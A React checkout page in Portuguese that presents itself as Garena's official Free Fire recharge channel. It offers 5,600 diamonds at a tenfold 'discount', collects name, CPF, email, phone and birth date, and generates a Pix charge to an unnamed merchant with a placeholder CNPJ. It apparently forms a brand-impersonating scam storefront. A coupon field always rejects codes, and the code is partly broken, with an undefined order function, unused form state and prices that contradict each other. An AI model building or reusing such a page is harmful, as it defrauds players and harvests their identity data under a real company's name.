import React, { useState, useEffect } from 'react';
import { ArrowLeft, ShoppingBag } from 'lucide-react';
import { Product, CustomerData, PaymentMethod, Order } from '../../types/checkout';
import OrderSummary from './OrderSummary';
import CustomerForm from './CustomerForm';
import PaymentMethods from './PaymentMethods';
import CouponInput from './CouponInput';
import PixPayment from '../checkout/PixPayment';
import '../../services/checkoutService'
import { getUTMParams, sendAnalyticsEvent } from '../../services/checkoutService';
import {
  validateCPF, validatePhone, validateCEP, validateBirthDate, formatPhone, formatCPF, validateEmail
} from '../../utils/validators';
import '../../styles/checkout.css';
import '../../styles/checkout-garena.css';

import { maskPhone, maskCPF, maskDate } from "../../utils/masks";
import { emailSuggestion } from "../../utils/emailAutoComplete";


interface CheckoutPageProps {
  initialProducts?: Product[];
  onBack?: () => void;
}

const defaultProducts: Product[] = [
  {
    id: '1',
    name: '5.600 Diamantes',
    sku: 'FF-5600-DM',
    quantity: 1,
    price: 19.90,
    originalPrice: 199.00,
    imageUrl: '/diamantes.png',
    bonus: '1.200 bônus',
  },
];

export default function CheckoutPage({ initialProducts, onBack }: CheckoutPageProps) {
  // --- estados / lógica original (mantidos) ---
  const [formData, setFormData] = useState<CustomerData>({
    name: "",
    email: "",
    cpf: "",
  });
  const [products, setProducts] = useState<Product[]>(initialProducts || defaultProducts);
  const [couponInput, setCouponInput] = useState<string>("");
  const [cupom, setCupom] = useState("");
  const [isApplying, setIsApplying] = useState(false);
  const [couponMessage, setCouponMessage] = useState<string | null>(null);



  const [showPix, setShowPix] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const amount = 10; // valor de teste
  const [loading, setLoading] = useState(false);



  const [customer, setCustomer] = useState({
    name: "",
    email: "",
    cpf: "",
  });


  const [errors, setErrors] = useState({
    cpf: "",
    email: "",
    phone: "",

  });

  // 2) helper que retorna a mensagem padrão por campo
  const getFieldMessage = (field: string) => {
    switch (field) {
      case "cpf": return "CPF inválido.";
      case "email": return "E-mail inválido.";
      case "phone": return "Telefone inválido.";
      case "birthDate": return "Data de nascimento inválida.";
      default: return "Campo inválido.";
    }
  };

  const handleValidateCustomerField = (field: keyof typeof errors, isValid: boolean) => {
    setErrors(prev => ({ ...prev, [field]: isValid ? "" : getFieldMessage(field) }));
  };

  const [customerData, setCustomerData] = useState<CustomerData>({
    fullName: '',
    cpf: '',
    email: '',
    phone: '',
    cep: '',
    street: '',
    number: '',
    complement: '',
    neighborhood: '',
    city: '',
    state: '',
    birthDate: ''

  });

  // CPF
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value); // sua função formatCPF
    setCustomerData(prev => ({ ...prev, cpf: formatted }));

    // valida o CPF real (validateCPF remove non digits internamente)
    const ok = validateCPF(formatted);
    handleValidateCustomerField("cpf", ok);
  };

  const handleValidateEmail = (value: string) => {
    setCustomerData(prev => ({ ...prev, email: value }));

    // 1. validação simples
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(value)) {
      setErrors(prev => ({ ...prev, email: "E-mail inválido." }));
      return;
    }

    // 2. provedores aceitos (opcional)
    const allowedProviders = [
      "gmail.com",
      "hotmail.com",
      "outlook.com",
      "live.com",
      "yahoo.com",
      "icloud.com"
    ];

    const domain = value.split("@")[1]?.toLowerCase();

    if (!domain || !allowedProviders.includes(domain)) {
      setErrors(prev => ({ ...prev, email: "Use um e-mail válido (ex: @gmail.com)." }));
      return;
    }

    // 3. tudo certo
    setErrors(prev => ({ ...prev, email: "" }));
  };

  // Telefone
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value); // sua função formatPhone
    setCustomerData(prev => ({ ...prev, phone: formatted }));

    const ok = validatePhone(formatted);
    handleValidateCustomerField("phone", ok);
  };

  // Data de nascimento (usa maskDate que você já usa)
  const handleBirthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");

    // Aplica máscara DD/MM/YYYY
    if (value.length > 2) {
      value = value.replace(/(\d{2})(\d)/, "$1/$2");
    }
    if (value.length > 5) {
      value = value.replace(/(\d{2}\/\d{2})(\d)/, "$1/$2");
    }

    // Limita a 10 caracteres
    if (value.length > 10) value = value.slice(0, 10);

    setCustomerData({ ...customerData, birthDate: value });
  };




  const onCustomerChange = (field: string, value: string) => {
    setCustomerData(prev => ({
      ...prev,
      [field]: value
    }));
  };



  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>({ type: 'pix' });
  const [customerErrors, setCustomerErrors] = useState<Partial<Record<keyof CustomerData, string>>>({});
  const [paymentErrors, setPaymentErrors] = useState<Record<string, string>>({});
  const [shipping] = useState(0);
  const [discount, setDiscount] = useState(0);
  const [couponCode, setCouponCode] = useState<string>();
  const [showPixModal, setShowPixModal] = useState(false);
  const [paymentResponse, setPaymentResponse] = useState<any>(null);

  useEffect(() => {
    sendAnalyticsEvent('view_checkout', {
      value: products.reduce((acc, p) => acc + p.price * p.quantity, 0),
      currency: 'BRL',
      items: products.map((p) => ({
        item_id: p.id,
        item_name: p.name,
        price: p.price,
        quantity: p.quantity,
      })),
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleUpdateQuantity = (productId: string, newQuantity: number) => {
    setProducts((prev) => prev.map((p) => (p.id === productId ? { ...p, quantity: newQuantity } : p)));
  };

  const handleRemoveProduct = (productId: string) => {
    setProducts((prev) => prev.filter((p) => p.id !== productId));
  };

  const handleApplyCoupon = (code: string, discountAmount: number) => {
    setCouponCode(code);
    setDiscount(discountAmount);
    sendAnalyticsEvent('add_coupon', { coupon: code });
  };

  const handleRemoveCoupon = () => {
    setCouponCode(undefined);
    setDiscount(0);
  };

  const validateCustomerForm = (): boolean => {
    const errors: Partial<Record<keyof CustomerData, string>> = {};

    if (!customerData.fullName.trim()) errors.fullName = 'Nome completo é obrigatório';
    if (!validateCPF(customerData.cpf)) errors.cpf = 'CPF inválido';
    if (errors.email) errors.email = errors.email;
    if (!validatePhone(customerData.phone)) errors.phone = 'Telefone inválido (deve ter 11 dígitos com DDD)';
    if (!validateCEP(customerData.cep)) errors.cep = 'CEP inválido';
    if (!customerData.street.trim()) errors.street = 'Logradouro é obrigatório';
    if (!customerData.number.trim()) errors.number = 'Número é obrigatório';
    if (!customerData.neighborhood.trim()) errors.neighborhood = 'Bairro é obrigatório';
    if (!customerData.city.trim()) errors.city = 'Cidade é obrigatória';
    if (!customerData.state) errors.state = 'Estado é obrigatório';

    setCustomerErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const validatePaymentForm = (): boolean => {
    const errors: Record<string, string> = {};

    if (paymentMethod.type === 'credit_card') {
      const cardData = paymentMethod.cardData;
      if (!cardData?.number || cardData.number.replace(/\s/g, '').length < 13) errors.cardNumber = 'Número do cartão inválido';
      if (!cardData?.holderName || cardData.holderName.trim().length < 3) errors.cardHolder = 'Nome do titular é obrigatório';
      if (!cardData?.expiry || cardData.expiry.length !== 5) errors.cardExpiry = 'Data de validade inválida';
      if (!cardData?.cvv || cardData.cvv.length < 3) errors.cardCVV = 'CVV inválido';
    }

    setPaymentErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const isCustomerValid = validateCustomerForm();
    const isPaymentValid = validatePaymentForm();

    if (!isCustomerValid || !isPaymentValid) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }

    setLoading(true);

    const subtotal = products.reduce((acc, p) => acc + p.price * p.quantity, 0);
    const total = subtotal + shipping - discount;

    const order: Order = { products, customer: customerData, payment: paymentMethod, subtotal, shipping, discount, total, couponCode, utmParams: getUTMParams() };

    sendAnalyticsEvent('begin_checkout', {
      value: total,
      currency: 'BRL',
      items: products.map((p) => ({ item_id: p.id, item_name: p.name, price: p.price, quantity: p.quantity })),
    });

    sendAnalyticsEvent('add_payment_info', { payment_type: paymentMethod.type });

    const response = await createOrder(order);
    setLoading(false);

    if (response.success) {
      if (paymentMethod.type === 'pix' && response.qrCode && response.copyPaste) {
        setPaymentResponse(response);
        setShowPixModal(true);
      } else {
        sendAnalyticsEvent('purchase', {
          transaction_id: response.orderId,
          value: total,
          currency: 'BRL',
          items: products.map((p) => ({ item_id: p.id, item_name: p.name, price: p.price, quantity: p.quantity })),
        });

        alert(`Pedido criado com sucesso! ID: ${response.orderId}`);
      }
    } else {
      alert(`Erro ao processar pagamento: ${response.message}`);
    }
  };


  const handleValidatePaymentField = (field: string, isValid: boolean) => {
    setPaymentErrors((prev) => {
      const newErrors = { ...prev };
      if (isValid) delete newErrors[field];
      return newErrors;
    });
  };

  const subtotal = products.reduce((acc, p) => acc + p.price * p.quantity, 0);
  const phoneLength = maskPhone(customerData.phone).length;
  const allValid =
    customerData.fullName.trim().length >= 3 &&
    validateCPF(customerData.cpf) &&
    validatePhone(customerData.phone) &&
    validateBirthDate(customerData.birthDate || "") &&
    errors.email === "";





  // --- JSX: layout estilo Garena ---
  return (
    <>
      <img
        className="background-ff"
        src="https://assets.recargajogo.com.br/gop/mshop/www/live/assets/FF-06d91604.png"
        alt=""
      />




      <div
        className="ff-background"
        // usando arquivo local do container conforme solicitado
        style={{ backgroundImage: "url('/mnt/data/839b407e-0b58-43fb-9f25-07e5866ce17b.png')" }}
      >
        {/* HEADER */}
        <header className="sticky-alt">
          <div className="container-alt">
            <div className="flex-alt align-center-alt justify-between-alt">
              <a href="/" className="flex-alt align-center-alt">
                <div className="flex-alt align-center-alt">
                  <img
                    src="/images/logo-mobile.svg"
                    alt="Garena"
                    className="block-alt show-mobile-alt"
                  />
                  <img
                    src="/images/logo.svg"
                    alt="Garena"
                    className="none-alt show-desktop-alt"
                  />
                  <div className="divider-alt"></div>
                </div>
                <div className="header-text-alt">Canal Oficial de Recarga</div>
              </a>

              <div className="flex-alt align-center-alt">
                <img
                  src="/images/avatar.svg"
                  alt="Player Avatar"
                  width={30}
                  style={{ borderRadius: "50%" }}
                />
              </div>
            </div>
          </div>
        </header>

        <main className="container main-content ff-main">

          <form onSubmit={(e) => e.preventDefault()} className="ff-checkout-grid">
            {/* --- coluna central do card (visual principal) --- */}

            <section className="ff-card">
              <button type="button" className="ff-back-btn" onClick={onBack}><svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 24 24"><g fill="none" fill-rule="evenodd"><path d="M24 0v24H0V0zM12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z" /><path fill="currentColor" d="M7.94 13.06a1.5 1.5 0 0 1 0-2.12l5.656-5.658a1.5 1.5 0 1 1 2.121 2.122L11.122 12l4.596 4.596a1.5 1.5 0 1 1-2.12 2.122l-5.66-5.658Z" /></g></svg> Voltar</button>

              <div className="ff-card-top">
                <div className="ff-banner">
                  {/* substitua por <img/> se tiver banner real */}
                  <img src="/images/FF-f997537d.jpg" alt="Banner" />
                </div>

                <div className="ff-game-icon">
                  <img src="/images/icon.png" alt="Free Fire" />
                </div>

                <h2 className="ff-game-title">Free Fire</h2>
              </div>
              <div className="ff-background-total">
                <div className="ff-totals">
                  <div style={{ background: 2 }} className="ff-total-line">
                    <span>Total</span>
                    <span className="value"><small className="diamond"><img style={{ width: 16, display: 'inline' }} src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></small> 78 </span>
                  </div>

                  <div className="ff-breakdown">
                    <div className="item"><span>Preço Original</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> 65</span></div>
                    <div className="item"><span>+ Bônus Geral</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" />  13</span></div>
                  </div>
                </div>
                <p className="ff-note">Os diamantes serão creditados diretamente na conta do jogo assim que recebermos a confirmação de pagamento.</p>

                <div className="ff-info-rows">
                  <div className="row"><span>Preço</span><strong>R$ 3,00</strong></div>
                  <div className="row"><span>Método de pagamento</span><strong>Pix via PagSeguro</strong></div>
                  <div className="row"><span>Nome do Jogador</span><strong>{customerData.fullName || 'SeuNickFF'}</strong></div>
                </div>
              </div>

              {!showPix && (
                <div className="checkout-form">


                  {/* CUPOM */}
                  <div className="cupom-area">
                    <label>Código Promocional</label>

                    <div className="cupom-box">
                      <input
                        type="text"
                        placeholder="Código Promocional. Exemplo: PROMO1234"
                        value={couponInput}
                        onChange={(e) => setCouponInput(e.target.value)}
                        className="cupom-input"
                      />



                      <button
                        type="button"
                        className={`btn-aplicar ${couponInput.trim() ? "ativo" : "inativo"}`}
                        disabled={!couponInput.trim() || isApplying}
                        onClick={async () => {
                          if (!couponInput.trim()) return;

                          setIsApplying(true);

                          await new Promise(resolve => setTimeout(resolve, 600));

                          // aplica o cupom no seu sistema
                          handleApplyCoupon(couponInput.trim(), 0);

                          // mensagem vermelha (sempre)
                          setCouponMessage("Cupom inválido ou expirado.");

                          setIsApplying(false);
                        }}
                      >
                        {isApplying ? "Aplicando..." : "Aplicar"}
                      </button>
                    </div>
                    {couponMessage && (
                      <p style={{ color: "#ff4d4d", fontSize: "12px", marginTop: "6px" }}>
                        {couponMessage}
                      </p>
                    )}

                    <p className="legend">
                      Possui um cupom de desconto? Digite acima para aplicar
                    </p>
                  </div>




                  <div className="input-group">
                    <label>Nome Completo </label>
                    <input
                      type="text"
                      placeholder="Nome Completo"
                      value={customerData.fullName || ""}
                      onChange={(e) =>
                        onCustomerChange("fullName", e.target.value)
                      }
                    />




                  </div>


                  <div className="input-group">
                    <label>E-mail </label>
                    <input
                      type="text"
                      value={customerData.email}
                      onChange={(e) => handleValidateEmail(e.target.value)}
                    />
                    {errors.email && <p className="error-text">{errors.email}</p>}


                    <datalist id="email-options">
                      {emailSuggestion(customerData.email).map((suggestion) => (
                        <option key={suggestion} value={suggestion} />
                      ))}
                    </datalist>
                  </div>



                  <div className="two-columns">
                    <div className="input-group">
                      <label>CPF </label>
                      <input
                        type="text"
                        value={customerData.cpf}
                        onChange={handleCPFChange}
                        placeholder="CPF"
                      />
                    </div>




                    <div className="input-group">
                      <label>Data de Nascimento</label>
                      <input
                        type="text"
                        value={customerData.birthDate}
                        onChange={handleBirthChange}
                        placeholder="DD/MM/AAAA"
                      />
                    </div>
                  </div>
                  {errors.birthDate && <p className="error-text-data">{errors.birthDate}</p>}




                  <div className="input-group">
                    <label>Número de telefone </label>
                    <input
                      type="text"
                      value={formatPhone(customerData.phone)}
                      onChange={(e) => {
                        const raw = e.target.value.replace(/\D/g, "");
                        setCustomerData({ ...customerData, phone: raw });
                      }}
                      placeholder="Número de telefone"
                    />
                  </div>

                  {errors.cpf && <p style={{ position: 'relative', top: '20' }} className="error-text-cpf">{errors.cpf}</p>}






                  <button
                    type="button"
                    className={`pay-button ${allValid ? "active" : "disabled"}`}
                    disabled={!allValid || loading}
                    onClick={async () => {
                      try {
                        console.log("→ Iniciando criação do PIX...");

                        const response = await fetch("/api/create-pix", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({
                            value: Math.round(amount * 100),   // 🔥 valor EM CENTAVOS
                            name: formData.fullName,           // 🔥 nome correto
                            email: formData.email,
                            document: formData.cpf.replace(/\D/g, "") // 🔥 CPF sem máscara
                          })
                        });

                        const data = await response.json();
                        console.log("PIX DATA:", data);

                        if (!response.ok) {
                          alert("Erro ao gerar pagamento Pix. Tente novamente.");
                          return;
                        }

                        setPixData({
                          pixCode: data.copyPaste,
                          qrCodeBase64: data.qrCode,
                          merchant: "RECARGA",
                          cnpj: "00.000.000/0000-00"
                        });

                        setShowPix(true);
                      } catch (err) {
                        console.error("ERRO NO PIX:", err);
                        alert("Erro inesperado ao gerar PIX.");
                      }
                    }}


                  >
                    {loading ? "Gerando Pix..." : "Prosseguir para pagamento"}
                  </button>

                </div>
              )}


            </section>


          </form>

          {showPix && (
            <PixPayment
              pixCode={pixData.pixCode}
              qrCodeBase64={pixData.qrCodeBase64}
              amount={amount}
              merchantName={pixData.merchant}
              merchantCnpj={pixData.cnpj}
              onBack={() => setShowPix(false)}
            />
          )}
        </main>



        <div className="checkout-footer" style={{ marginTop: '28px' }}>
          <div className="checkout-footer-container">
            <div
              className="checkout-footer-content d-flex align-items-center justify-content-between"
              style={{ padding: '18px 0' }}
            >
              <span>© Garena Online. Todos os direitos reservados.</span>

              <div className="checkout-footer-links">
                <a href="#">FAQ</a>
                <span className="divider">|</span>
                <a href="#">Termos e Condições</a>
                <span className="divider">|</span>
                <a href="#">Política de Privacidade</a>
              </div>
            </div>
          </div>

        </div>

      </div>

      {console.log("showPix:", showPix)}



    </>
  );
}
